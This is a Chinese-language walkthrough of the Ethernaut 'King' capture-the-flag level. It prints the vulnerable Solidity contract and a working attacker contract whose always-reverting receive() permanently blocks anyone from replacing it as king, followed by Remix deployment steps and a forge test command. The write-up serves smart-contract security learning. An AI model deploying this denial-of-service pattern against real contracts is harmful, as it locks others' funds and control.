# level9 king

# 1. 问题

要求你成为`King`合约的owner，切别的合约无法替代你成为owner。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```

# 2. 解法

整体的思路分为2步：

1. 首先给`King`合约转入eth，触发其receive函数逻辑执行，使自己成为owner
2. 使破坏receive()正常执行，使得其他合约或EOA触发`King`的receive函数执行时都失败，从而避免别人成为owner

为了实现这个功能，我们将合约设计如下：

```solidity
contract UnchangedKing {
    address private king;

    constructor(address _k) {
        king = _k;
    }

    function overtake() external payable {
        // console.log("start overtake, msg.value:", msg.value);
        // console.log("start overtake, gasleft  :", gasleft());
        // case1: 可行
        (bool success,) = king.call{value: 0.001 ether}("");
        // 这样会出错，gas是为了后面支付合约执行使用的, 真实值会远大于 msg.value, 而且不是一个维度的东西
        // (bool success, ) = king.call{value: gasleft() * 19 /20}("");
        require(success, "send eth failed");
    }

    receive() external payable {
        revert("No direct ETH transfers allowed");
        // 下面这种写法是不行的。因为owner可以transfer(0)给当前合约，导致下面这个判断不生效
        // require(msg.value < 1, "reject be overtaken!");
    }
}
```

1. 代码部署到remix，编译

2. 部署，参数填上合约地址 
   * 注意合约初始化的参数要填instance的地址，不要填错橙了level的地址了

3. 先查询下浏览器，看下合约目前有多少eth, 发现是1 finney

4. 调用overtake函数，就传入1 finney 

5. submit instance，通过！


# 3. 补充阅读：调试

开始的时候，我们采用了`require(msg.value < 1, "reject be overtaken!");`的写法，发现不能通过，所以便携了一个调试程序[Level9_localTest.t.sol](../../test/level9/Level9_localTest.t.sol), 可以在项目根目录执行下面命令调试运行：

```bash
forge test -vvvv --match-contract Level9LocalTest
```
